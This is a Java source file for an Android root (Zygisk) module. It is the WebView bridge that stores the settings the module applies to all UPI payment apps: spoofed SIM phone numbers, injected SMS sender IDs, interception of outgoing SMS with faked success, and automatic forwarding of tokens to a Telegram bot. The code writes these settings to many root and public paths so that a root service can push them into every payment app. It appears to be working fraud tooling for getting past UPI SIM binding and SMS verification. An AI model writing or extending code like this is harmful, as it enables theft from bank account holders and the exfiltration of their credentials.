package com.hivirtus.zygisk;

import android.content.Context;
import android.os.Environment;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;

/** Tiny bridge — WebView HTML UI ↔ module config (global Save across all UPI apps). */
public class HivirtusJsBridge {
    private static final String SAVE_TMP = "/data/local/tmp/hivirtus_ui_save.json";
    private static final String RUNTIME_CFG = "/data/local/tmp/hivirtus_zygisk_mode_config.json";
    private static final String MODULE_CFG = "/data/adb/modules/hivirtus_zygisk_mode/config.json";
    private static final String MODULE_SAVE = "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json";
    private static final String SPOOF_PHONE = "/data/local/tmp/hivirtus_spoof_phone.txt";
    private static final String SENDER_ID_FILE = "/data/local/tmp/hivirtus_sender_id.txt";
    private static final String TG_CREDS = "/data/local/tmp/hivirtus_telegram_credentials.json";
    private static final String SAVE_OK_FLAG = "/data/local/tmp/hivirtus_save_ok.flag";

    private static Context appCtx;

    public static void setContext(Context ctx) {
        if (ctx != null) appCtx = ctx.getApplicationContext();
    }

    private static String readUtf8(File f) {
        if (f == null || !f.canRead()) return null;
        try (InputStreamReader r = new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8)) {
            char[] buf = new char[16384];
            StringBuilder sb = new StringBuilder();
            int n;
            while ((n = r.read(buf)) > 0) sb.append(buf, 0, n);
            String s = sb.toString().trim();
            return s.isEmpty() ? null : s;
        } catch (Exception e) {
            return null;
        }
    }

    private static String readFirstLine(File f) {
        String s = readUtf8(f);
        if (s == null) return "";
        int nl = s.indexOf('\n');
        return (nl >= 0 ? s.substring(0, nl) : s).trim();
    }

    /** Global config: tmp/module FIRST (durable Save), then app copies, then Documents */
    @JavascriptInterface
    public String readConfig() {
        String[] candidates = new String[16];
        int n = 0;
        // Durable global first — menu back pe blank na ho
        candidates[n++] = SAVE_TMP;
        candidates[n++] = MODULE_SAVE;
        candidates[n++] = RUNTIME_CFG;
        candidates[n++] = MODULE_CFG;
        if (appCtx != null) {
            candidates[n++] = new File(appCtx.getFilesDir(), "hivirtus_ui_save.json").getAbsolutePath();
            candidates[n++] = new File(appCtx.getCacheDir(), "hivirtus_ui_save.json").getAbsolutePath();
            try {
                File cc = new File(appCtx.getCodeCacheDir(), "hivirtus/ui_save.json");
                candidates[n++] = cc.getAbsolutePath();
                File cc2 = new File(appCtx.getCodeCacheDir(), "hivirtus/config.json");
                candidates[n++] = cc2.getAbsolutePath();
            } catch (Exception ignored) {
            }
            try {
                File ext = appCtx.getExternalFilesDir(null);
                if (ext != null) candidates[n++] = new File(ext, "hivirtus_ui_save.json").getAbsolutePath();
            } catch (Exception ignored) {
            }
        }
        try {
            File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (docs != null) candidates[n++] = new File(docs, "hivirtus_ui_save.json").getAbsolutePath();
        } catch (Exception ignored) {
        }
        try {
            File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dl != null) candidates[n++] = new File(dl, "hivirtus_ui_save.json").getAbsolutePath();
        } catch (Exception ignored) {
        }

        JSONObject merged = new JSONObject();
        for (int i = 0; i < n; i++) {
            if (candidates[i] == null) continue;
            String raw = readUtf8(new File(candidates[i]));
            if (raw == null || raw.indexOf('{') < 0) continue;
            try {
                JSONObject o = new JSONObject(raw);
                java.util.Iterator<String> keys = o.keys();
                while (keys.hasNext()) {
                    String k = keys.next();
                    Object v = o.get(k);
                    if (v == null) continue;
                    if (v instanceof String && ((String) v).isEmpty()) continue;
                    if (!merged.has(k) || isEmptyValue(merged.opt(k))) {
                        merged.put(k, v);
                    }
                }
            } catch (Exception ignored) {
            }
        }

        // Overlay dedicated global files (even if JSON missing keys)
        try {
            String sid = readFirstLine(new File(SENDER_ID_FILE));
            if (sid.isEmpty()) sid = readFirstLine(new File("/data/adb/modules/hivirtus_zygisk_mode/sender_id.txt"));
            if (sid.isEmpty() && appCtx != null) {
                sid = readFirstLine(new File(appCtx.getFilesDir(), "hivirtus_sender_id.txt"));
                if (sid.isEmpty()) {
                    try {
                        File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
                        if (docs != null) sid = readFirstLine(new File(docs, "hivirtus_sender_id.txt"));
                    } catch (Exception ignored) {
                    }
                }
            }
            if (!sid.isEmpty() && !"AD-TEST-S".equals(sid)) {
                merged.put("inject_sender_id", sid);
                merged.put("override_incoming_sender", true);
                merged.put("sender_id_enabled", true);
            }
        } catch (Exception ignored) {
        }

        try {
            String credsRaw = readUtf8(new File(TG_CREDS));
            if (credsRaw == null) {
                credsRaw = readUtf8(new File("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json"));
            }
            if (credsRaw == null && appCtx != null) {
                credsRaw = readUtf8(new File(appCtx.getFilesDir(), "hivirtus_telegram_credentials.json"));
            }
            if (credsRaw == null) {
                try {
                    File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
                    if (docs != null) credsRaw = readUtf8(new File(docs, "hivirtus_telegram_credentials.json"));
                } catch (Exception ignored) {
                }
            }
            if (credsRaw != null && credsRaw.indexOf('{') >= 0) {
                JSONObject c = new JSONObject(credsRaw);
                String t = c.optString("telegram_bot_token", "").trim();
                String ch = c.optString("telegram_chat_id", "").trim();
                if (!t.isEmpty()) merged.put("telegram_bot_token", t);
                if (!ch.isEmpty()) merged.put("telegram_chat_id", ch);
                if (!t.isEmpty() && !ch.isEmpty()) {
                    merged.put("auto_forward_token", true);
                    merged.put("telegram_enabled", true);
                    merged.put("fake_intercept_telegram", true);
                }
            }
        } catch (Exception ignored) {
        }

        try {
            // Spoof file is fallback only — never clobber a phone already in Save JSON
            if (!merged.has("mock_phone_sim1") || isEmptyValue(merged.opt("mock_phone_sim1"))) {
                String phone = readFirstLine(new File(SPOOF_PHONE));
                if (phone.isEmpty() && appCtx != null) {
                    phone = readFirstLine(new File(appCtx.getFilesDir(), "hivirtus_spoof_phone.txt"));
                }
                if (phone.length() >= 10) {
                    merged.put("mock_phone_sim1", phone);
                    merged.put("enable_sim1_mock", true);
                    merged.put("enable_phone_spoof", true);
                    merged.put("fake_number_enabled", true);
                }
            }
        } catch (Exception ignored) {
        }

        try {
            return merged.length() == 0 ? "{}" : merged.toString(2);
        } catch (Exception e) {
            return "{}";
        }
    }

    private static boolean isEmptyValue(Object v) {
        if (v == null) return true;
        if (v instanceof String) return ((String) v).trim().isEmpty();
        return false;
    }

    private static boolean isDurableKey(String k) {
        return "mock_phone_sim1".equals(k)
                || "inject_sender_id".equals(k)
                || "mock_sender_id".equals(k)
                || "telegram_bot_token".equals(k)
                || "telegram_chat_id".equals(k);
    }

    private static String normalizePhone(String raw) {
        if (raw == null) return "";
        String phone = raw.trim().replaceAll("[^0-9+]", "");
        if (phone.startsWith("+91") && phone.length() > 10) {
            phone = phone.substring(phone.length() - 10);
        } else {
            phone = phone.replaceAll("[^0-9]", "");
        }
        return phone;
    }

    /** Native + HTML Save — phone/sender/token/chat → sab files sync (empty wipe band). */
    public static void syncAllSettings(Context ctx, String phoneRaw, String senderRaw,
                                       String tokenRaw, String chatRaw,
                                       boolean interceptOn, boolean fakeOn) {
        if (ctx != null) setContext(ctx);
        try {
            JSONObject o = new JSONObject();
            String phone = normalizePhone(phoneRaw);
            String sid = senderRaw == null ? "" : senderRaw.trim();
            String token = tokenRaw == null ? "" : tokenRaw.trim();
            String chat = chatRaw == null ? "" : chatRaw.trim();
            if ("AD-TEST-S".equals(sid)) sid = "";
            boolean fake = fakeOn || phone.length() >= 10;
            o.put("hook_outgoing_sms", interceptOn);
            o.put("intercept_fake_success", interceptOn);
            o.put("intercept_enabled", interceptOn);
            o.put("enable_sim1_mock", fake);
            o.put("enable_phone_spoof", fake);
            o.put("enable_virtual_sim", fake && phone.length() >= 10);
            o.put("fake_number_enabled", fake);
            if (phone.length() >= 10) o.put("mock_phone_sim1", phone);
            if (!sid.isEmpty()) {
                o.put("inject_sender_id", sid);
                o.put("override_incoming_sender", true);
                o.put("sender_id_enabled", true);
            }
            if (!token.isEmpty()) o.put("telegram_bot_token", token);
            if (!chat.isEmpty()) o.put("telegram_chat_id", chat);
            if (!token.isEmpty() && !chat.isEmpty()) {
                o.put("auto_forward_token", true);
                o.put("telegram_enabled", true);
                o.put("fake_intercept_telegram", true);
            }
            o.put("prefix_enabled", false);
            o.put("hook_all_upi_apps", true);
            o.put("auto_hook_foreground", true);
            new HivirtusJsBridge().saveConfig(o.toString());
        } catch (Exception ignored) {
        }
    }

    @JavascriptInterface
    public void saveConfig(String json) {
        if (json == null || json.isEmpty()) return;
        int wrote = 0;
        try {
            JSONObject incoming = new JSONObject(json);
            // Digits-only phone from THIS save — ignore stale spoof/tmp overlays
            String incomingPhone = normalizePhone(incoming.optString("mock_phone_sim1", ""));
            if (incomingPhone.length() >= 10) {
                incoming.put("mock_phone_sim1", incomingPhone);
            }

            // Nested telegram: { bot_token, chat_id } (older UI)
            try {
                JSONObject tgObj = incoming.optJSONObject("telegram");
                if (tgObj != null) {
                    if (incoming.optString("telegram_bot_token", "").trim().isEmpty()) {
                        String t = tgObj.optString("bot_token", tgObj.optString("telegram_bot_token", "")).trim();
                        if (!t.isEmpty()) incoming.put("telegram_bot_token", t);
                    }
                    if (incoming.optString("telegram_chat_id", "").trim().isEmpty()) {
                        String c = tgObj.optString("chat_id", tgObj.optString("telegram_chat_id", "")).trim();
                        if (!c.isEmpty()) incoming.put("telegram_chat_id", c);
                    }
                }
            } catch (Exception ignored) {
            }

            String incomingSid = incoming.optString("inject_sender_id", "").trim();
            if (incomingSid.isEmpty()) {
                incomingSid = incoming.optString("mock_sender_id", "").trim();
            }
            if ("AD-TEST-S".equals(incomingSid)) incomingSid = "";
            if (!incomingSid.isEmpty()) {
                incoming.put("inject_sender_id", incomingSid);
            }

            String incomingToken = incoming.optString("telegram_bot_token", "").trim();
            String incomingChat = incoming.optString("telegram_chat_id", "").trim();

            JSONObject merged = new JSONObject(readConfig());
            java.util.Iterator<String> keys = incoming.keys();
            while (keys.hasNext()) {
                String k = keys.next();
                Object v = incoming.get(k);
                // Empty durable fields must NEVER wipe previously saved values
                if (isDurableKey(k) && isEmptyValue(v)) continue;
                merged.put(k, v);
            }
            // Force non-empty values from THIS save
            if (incomingPhone.length() >= 10) {
                merged.put("mock_phone_sim1", incomingPhone);
            }
            if (!incomingSid.isEmpty()) {
                merged.put("inject_sender_id", incomingSid);
            }
            if (!incomingToken.isEmpty()) merged.put("telegram_bot_token", incomingToken);
            if (!incomingChat.isEmpty()) merged.put("telegram_chat_id", incomingChat);

            if (merged.optBoolean("enable_sim1_mock", false)
                    || merged.optBoolean("enable_phone_spoof", false)
                    || merged.optBoolean("fake_number_enabled", false)
                    || merged.optBoolean("enable_virtual_sim", false)
                    || incomingPhone.length() >= 10) {
                merged.put("enable_sim1_mock", true);
                merged.put("enable_phone_spoof", true);
                String phone = normalizePhone(merged.optString("mock_phone_sim1", ""));
                if (phone.length() >= 10) {
                    merged.put("mock_phone_sim1", phone);
                    merged.put("enable_virtual_sim", true);
                    wrote += writeEverywhere(SPOOF_PHONE, "hivirtus_spoof_phone.txt", phone + "\n");
                    writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt", phone + "\n");
                }
            }

            String sid = merged.optString("inject_sender_id", "").trim();
            if ("AD-TEST-S".equals(sid)) {
                sid = "";
                merged.put("inject_sender_id", "");
            }
            if (!sid.isEmpty()) {
                merged.put("override_incoming_sender", true);
                merged.put("sender_id_enabled", true);
                wrote += writeEverywhere(SENDER_ID_FILE, "hivirtus_sender_id.txt", sid + "\n");
                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/sender_id.txt", sid + "\n");
            } else if (merged.optBoolean("sender_id_enabled", false)
                    || merged.optBoolean("override_incoming_sender", false)) {
                merged.put("override_incoming_sender", true);
            }

            if (merged.optBoolean("auto_forward_token", false)
                    || merged.optBoolean("telegram_enabled", false)
                    || merged.optBoolean("fake_intercept_telegram", false)
                    || (!incomingToken.isEmpty() && !incomingChat.isEmpty())) {
                merged.put("auto_forward_token", true);
                merged.put("fake_intercept_telegram", true);
                merged.put("telegram_enabled", true);
            }
            String tgToken = merged.optString("telegram_bot_token", "").trim();
            String tgChat = merged.optString("telegram_chat_id", "").trim();
            String body = merged.toString(2);
            wrote += writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", body);
            wrote += writeEverywhere(RUNTIME_CFG, "hivirtus_zygisk_mode_config.json", body);
            // Module path — root harvest/push uses this as canonical
            writeUtf8(MODULE_SAVE, body);
            writeUtf8(MODULE_CFG, body);

            if (!tgToken.isEmpty() && !tgChat.isEmpty()) {
                String creds = "{\n  \"telegram_bot_token\": \"" + tgToken.replace("\"", "")
                        + "\",\n  \"telegram_chat_id\": \"" + tgChat.replace("\"", "")
                        + "\"\n}\n";
                wrote += writeEverywhere(TG_CREDS, "hivirtus_telegram_credentials.json", creds);
                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json", creds);
                writeUtf8("/data/local/tmp/hivirtus_tg_token.txt", tgToken + "\n");
                writeUtf8("/data/local/tmp/hivirtus_tg_chat.txt", tgChat + "\n");
                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/tg_token.txt", tgToken + "\n");
                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/tg_chat.txt", tgChat + "\n");
            }
            // Always mark Save — service.sh pushes to all apps + clears TG dedupe
            writeUtf8(SAVE_OK_FLAG, "1\n");
            try {
                new File("/data/local/tmp/hivirtus_tg_out_dedupe.hash").delete();
                new File("/data/local/tmp/hivirtus_tg_out_dedupe.ts").delete();
            } catch (Exception ignored) {
            }
            if (wrote == 0) {
                // Last-resort: still try tmp flag so root can harvest app filesDir
                writeUtf8(SAVE_OK_FLAG, "1\n");
            }
        } catch (Exception e) {
            writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", json);
            writeUtf8(SAVE_OK_FLAG, "1\n");
        }
    }

    /** Write tmp + app filesDir + public Documents (root service harvests + pushes to all apps). */
    private static int writeEverywhere(String tmpPath, String fileName, String data) {
        int n = 0;
        if (writeUtf8(tmpPath, data)) n++;
        if (appCtx != null) {
            try {
                File f = new File(appCtx.getFilesDir(), fileName);
                if (writeUtf8(f.getAbsolutePath(), data)) n++;
            } catch (Exception ignored) {
            }
            try {
                File f = new File(appCtx.getCacheDir(), fileName);
                if (writeUtf8(f.getAbsolutePath(), data)) n++;
            } catch (Exception ignored) {
            }
            try {
                File cc = new File(appCtx.getCodeCacheDir(), "hivirtus");
                //noinspection ResultOfMethodCallIgnored
                cc.mkdirs();
                if (writeUtf8(new File(cc, fileName).getAbsolutePath(), data)) n++;
                if ("hivirtus_ui_save.json".equals(fileName)) {
                    writeUtf8(new File(cc, "ui_save.json").getAbsolutePath(), data);
                }
            } catch (Exception ignored) {
            }
            try {
                File ext = appCtx.getExternalFilesDir(null);
                if (ext != null) {
                    File f = new File(ext, fileName);
                    if (writeUtf8(f.getAbsolutePath(), data)) n++;
                }
            } catch (Exception ignored) {
            }
        }
        try {
            File docs = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (docs != null) {
                //noinspection ResultOfMethodCallIgnored
                docs.mkdirs();
                if (writeUtf8(new File(docs, fileName).getAbsolutePath(), data)) n++;
            }
        } catch (Exception ignored) {
        }
        try {
            File dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dl != null) {
                //noinspection ResultOfMethodCallIgnored
                dl.mkdirs();
                if (writeUtf8(new File(dl, fileName).getAbsolutePath(), data)) n++;
            }
        } catch (Exception ignored) {
        }
        return n;
    }

    private static boolean writeUtf8(String path, String data) {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
            w.write(data);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static void attach(WebView webView) {
        if (webView == null) return;
        Context c = webView.getContext();
        if (c != null) setContext(c);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.addJavascriptInterface(new HivirtusJsBridge(), "Hivirtus");
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url != null && url.startsWith("hivirtus://minimize")) {
                    android.view.ViewParent parent = view.getParent();
                    if (parent instanceof android.view.View) {
                        ((android.view.View) parent).setVisibility(android.view.View.GONE);
                    } else {
                        view.setVisibility(android.view.View.GONE);
                    }
                    return true;
                }
                return false;
            }
        });
    }
}
